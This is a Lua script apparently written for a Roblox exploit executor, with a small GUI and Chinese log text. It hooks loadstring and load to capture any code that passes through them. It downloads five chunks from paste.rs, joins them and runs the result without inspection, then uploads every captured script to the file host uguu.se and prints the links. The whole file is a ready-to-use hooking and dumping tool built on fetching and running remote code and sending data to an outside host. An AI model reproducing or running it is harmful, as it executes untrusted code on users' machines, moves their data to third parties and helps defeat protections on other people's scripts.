local U={"https://paste.rs/6EBBH","https://paste.rs/vMdfC","https://paste.rs/mvAbJ","https://paste.rs/3LvjP","https://paste.rs/RxVut"}
local pg=game:GetService("Players").LocalPlayer:WaitForChild("PlayerGui")
local caps,seen={},{}
local log
local ol=loadstring
local function add(s)
  if type(s)~="string" or #s<500 then return end
  local k=#s.."|"..s:sub(1,50)
  if seen[k] then return end
  seen[k]=true
  caps[#caps+1]={src=s}
  log(("捕获[%d] %d 字节"):format(#caps,#s),Color3.fromRGB(150,255,150))
end
loadstring=function(s,n) add(s) return ol(s,n) end
if type(load)=="function" and load~=ol then
  local oL=load
  load=function(s,n) add(s) return oL(s,n) end
end
local gv=getgenv and getgenv()
if gv and gv.loadstring and gv.loadstring~=loadstring then
  local g=gv.loadstring
  gv.loadstring=function(s,n) add(s) return g(s,n) end
end
local gui=Instance.new("ScreenGui")
gui.Name="SrcCapV3"
gui.ResetOnSpawn=false
gui.DisplayOrder=999999
gui.Parent=pg
local f=Instance.new("Frame",gui)
f.Size=UDim2.new(0,600,0,340)
f.Position=UDim2.new(0.5,-300,0.5,-170)
f.BackgroundColor3=Color3.fromRGB(14,16,21)
f.BorderSizePixel=0
Instance.new("UICorner",f).CornerRadius=UDim.new(0,10)
local sc=Instance.new("ScrollingFrame",f)
sc.Size=UDim2.new(1,-16,1,-96)
sc.Position=UDim2.new(0,8,0,8)
sc.BackgroundTransparency=1
sc.BorderSizePixel=0
sc.ScrollBarThickness=6
sc.CanvasSize=UDim2.new(0,0,0,0)
sc.AutomaticCanvasSize=Enum.AutomaticSize.Y
Instance.new("UIListLayout",sc).Padding=UDim.new(0,2)
function log(s,c)
  local l=Instance.new("TextLabel",sc)
  l.Size=UDim2.new(1,-6,0,18)
  l.BackgroundTransparency=1
  l.Text=s
  l.TextColor3=c or Color3.fromRGB(205,210,220)
  l.TextSize=12
  l.Font=Enum.Font.Code
  l.TextXAlignment=Enum.TextXAlignment.Left
end
local B="----DSHFormBoundary7MA4YWxkTrZu0gW"
local function send(data)
  local body="--"..B.."\r\n"
    ..'Content-Disposition: form-data; name="files[]"; filename="f.lua"'.."\r\n"
    .."Content-Type: application/octet-stream\r\n\r\n"
    ..data.."\r\n--"..B.."--\r\n"
  for _=1,2 do
    local ok,r=pcall(function()
      return request({
        Url="https://uguu.se/upload?output=text",
        Method="POST",
        Body=body,
        Headers={["Content-Type"]="multipart/form-data; boundary="..B},
      })
    end)
    if ok and r and tostring(r.StatusCode):sub(1,1)=="2" then
      local u=tostring(r.Body):gsub("%s+$","")
      if u:sub(1,4)=="http" then return u end
    end
    task.wait(1)
  end
  return nil
end
local function up()
  task.spawn(function()
    for i,c in ipairs(caps) do
      if not c.done then
        log(("上传[%d] %d 字节…"):format(i,#c.src),Color3.fromRGB(255,220,120))
        local u=send(c.src)
        if u then
          c.done=true
          log(("完成[%d] %s"):format(i,u),Color3.fromRGB(150,255,150))
        else
          log(("失败[%d]，再按一次重试"):format(i),Color3.fromRGB(255,120,120))
        end
      end
    end
    log("全部处理完毕",Color3.fromRGB(150,255,150))
  end)
end
local b=Instance.new("TextButton",f)
b.Size=UDim2.new(1,-16,0,36)
b.Position=UDim2.new(0,8,1,-46)
b.BackgroundColor3=Color3.fromRGB(52,58,68)
b.Text="上传全部捕获"
b.TextColor3=Color3.fromRGB(232,232,236)
b.TextSize=14
b.Font=Enum.Font.GothamBold
b.BorderSizePixel=0
Instance.new("UICorner",b).CornerRadius=UDim.new(0,6)
b.MouseButton1Click:Connect(up)
log("挂钩完成，运行 loader…",Color3.fromRGB(120,200,240))
task.spawn(function()
  local t={}
  for i,u in ipairs(U) do
    local ok,r=pcall(function() return game:HttpGet(u) end)
    if not ok then log("下载失败 块"..i,Color3.fromRGB(255,120,120)) return end
    t[i]=r
  end
  local code=table.concat(t)
  log("loader "..#code,Color3.fromRGB(200,220,200))
  local fn=ol(code)
  if not fn then log("编译失败",Color3.fromRGB(255,120,120)) return end
  local ok2,res=pcall(fn)
  log("loader 结束 ok="..tostring(ok2),ok2 and Color3.fromRGB(150,255,150) or Color3.fromRGB(255,150,150))
  task.wait(4)
  if #caps>0 then up() end
end)
